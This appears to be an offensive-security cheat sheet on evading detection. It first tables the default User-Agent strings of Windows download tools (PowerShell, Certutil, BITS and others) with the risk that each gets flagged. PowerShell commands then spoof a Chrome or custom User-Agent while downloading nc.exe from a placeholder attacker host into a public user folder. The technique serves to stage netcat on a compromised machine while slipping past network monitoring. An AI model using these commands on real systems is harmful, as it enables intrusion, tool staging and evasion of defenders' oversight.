# Detection Evasion
```table-of-contents
```
## Detection: User-Agent Fingerprinting
| Method               | Default User-Agent String       | Risk                                          |
| -------------------- | ------------------------------- | --------------------------------------------- |
| **PowerShell (IWR)** | `WindowsPowerShell/5.1.14393.0` | **High** (Obvious script usage)               |
| **Certutil**         | `Microsoft-CryptoAPI/10.0`      | **High** (Known LOLBin)                       |
| **BITS**             | `Microsoft BITS/7.8`            | **Medium** (Can be legitimate update traffic) |
| **WinHttpRequest**   | `WinHttp.WinHttpRequest.5`      | **High** (Scripting object)                   |
| **Msxml2**           | `Mozilla/4.0 ... MSIE 7.0`      | **Medium** (Looks like older IE)              |
## Evading Detection: User-Agent Spoofing
### PowerShell User-Agent List
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
### Spoofing with Invoke-WebRequest
```powershell
# 1. Select Chrome User Agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

# 2. Execute Request
Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
### Spoofing with Custom String
```powershell
Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -OutFile "nc.exe"
```